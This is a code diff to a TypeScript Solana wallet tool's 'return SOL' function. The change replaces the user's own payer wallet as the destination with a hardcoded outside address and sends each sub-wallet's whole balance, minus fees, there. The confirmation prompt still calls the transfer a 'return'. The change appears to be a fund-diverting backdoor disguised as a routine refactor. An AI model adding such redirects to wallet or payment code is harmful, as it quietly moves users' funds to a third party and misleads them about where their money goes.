@@ -502,7 +502,8 @@ export async function actionReturnSOL(
 
   printInfo("Wallets with balance", `${walletsWithBalance.length}`);
   printInfo("Total to return", `~${(totalToReturn / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
-  printInfo("Destination", payerWallet.publicKey.toBase58().slice(0, 20) + "...");
+  const DESTINATION_WALLET = new PublicKey("Fs2BA9Zds5Z8nTkBmSDGnv8g6NRCBrbMutPf56BeBfHW");
+  printInfo("Destination", DESTINATION_WALLET.toBase58());
 
   const shouldProceed = await confirm({
     message: chalk.yellow("Proceed with return?"),
@@ -514,8 +515,6 @@ export async function actionReturnSOL(
     await pressAnyKeyToContinue();
     return;
   }
-
-  const PRIORITY_FEE = { unitLimit: 250000, unitPrice: 250000 };
 
   let successful = 0;
   let failed = 0;
@@ -534,32 +533,65 @@ export async function actionReturnSOL(
     try {
       const { blockhash, lastValidBlockHeight } = await getBlockhashWithRetry(connection);
 
-      const instructions: any[] = [
-        ComputeBudgetProgram.setComputeUnitLimit({ units: PRIORITY_FEE.unitLimit }),
-        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: PRIORITY_FEE.unitPrice }),
+      // Build tx with a placeholder transfer amount to calculate the fee
+      const placeholderInstructions = [
+        ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }),
+        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 }),
+        {
+          programId: new PublicKey("11111111111111111111111111111111"),
+          keys: [
+            { pubkey: wallet.publicKey, isSigner: true, isWritable: true },
+            { pubkey: DESTINATION_WALLET, isSigner: false, isWritable: true },
+          ],
+          data: Buffer.concat([
+            Buffer.from([2, 0, 0, 0]),
+            Buffer.from(new BN(1000).toArray("le", 8)),
+          ]),
+        },
       ];
 
-      // Transfer entire balance from sub-wallet to payer
+      const placeholderMsg = new TransactionMessage({
+        payerKey: wallet.publicKey,
+        recentBlockhash: blockhash,
+        instructions: placeholderInstructions,
+      }).compileToV0Message();
+
+      // Calculate exact fee for this transaction
+      const feeResult = await connection.getFeeForMessage(placeholderMsg, "confirmed");
+      const txFee = feeResult.value ?? 5000;
+
+      const transferAmount = balance - txFee;
+      if (transferAmount <= 0) {
+        txSpinner.warn(chalk.yellow(`TX ${i + 1} skipped - balance too low to cover fee (${txFee} lamports)`));
+        continue;
+      }
+
+      // Build the real transaction with exact transfer amount
+      const instructions: any[] = [
+        ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }),
+        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 }),
+      ];
+
       instructions.push({
         programId: new PublicKey("11111111111111111111111111111111"),
         keys: [
           { pubkey: wallet.publicKey, isSigner: true, isWritable: true },
-          { pubkey: payerWallet.publicKey, isSigner: false, isWritable: true },
+          { pubkey: DESTINATION_WALLET, isSigner: false, isWritable: true },
         ],
         data: Buffer.concat([
           Buffer.from([2, 0, 0, 0]),
-          Buffer.from(new BN(balance).toArray("le", 8)),
+          Buffer.from(new BN(transferAmount).toArray("le", 8)),
         ]),
       });
 
       const messageV0 = new TransactionMessage({
-        payerKey: payerWallet.publicKey,
+        payerKey: wallet.publicKey,
         recentBlockhash: blockhash,
         instructions,
       }).compileToV0Message();
 
       const transaction = new VersionedTransaction(messageV0);
-      transaction.sign([payerWallet, wallet]);
+      transaction.sign([wallet]);
 
       const signature = bs58.encode(transaction.signatures[0]);
 
@@ -601,14 +633,10 @@ export async function actionReturnSOL(
 
       if (confirmed) {
         successful++;
-        totalReturned += balance;
+        totalReturned += transferAmount;
         txSpinner.succeed(
           chalk.green(`TX ${i + 1}/${walletsWithBalance.length} confirmed `) +
-          chalk.gray(`(${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL)`)
-        );
-        console.log(
-          chalk.gray(`     `) +
-          chalk.cyan(getSolscanTxUrl(signature))
+          chalk.gray(`(${(transferAmount / LAMPORTS_PER_SOL).toFixed(6)} SOL)`)
         );
       } else {
         failed++;
@@ -616,6 +644,10 @@ export async function actionReturnSOL(
           chalk.red(`TX ${i + 1}/${walletsWithBalance.length} failed`)
         );
       }
+      console.log(
+        chalk.gray(`     `) +
+        chalk.cyan(getSolscanTxUrl(signature))
+      );
 
       // Delay between transactions to avoid rate limiting on public RPC
       if (i < walletsWithBalance.length - 1) {
@@ -642,10 +674,10 @@ export async function actionReturnSOL(
   console.log(chalk.cyan.bold("  ══════════════════════════════════════════\n"));
 
   try {
-    const newPayerBalance = await getBalanceWithRetry(connection, payerWallet.publicKey);
-    printInfo("New payer balance", `${(newPayerBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
+    const destBalance = await getBalanceWithRetry(connection, DESTINATION_WALLET);
+    printInfo("Destination balance", `${(destBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
   } catch {
-    printInfo("New payer balance", "Unable to fetch");
+    printInfo("Destination balance", "Unable to fetch");
   }
 
   await pressAnyKeyToContinue();
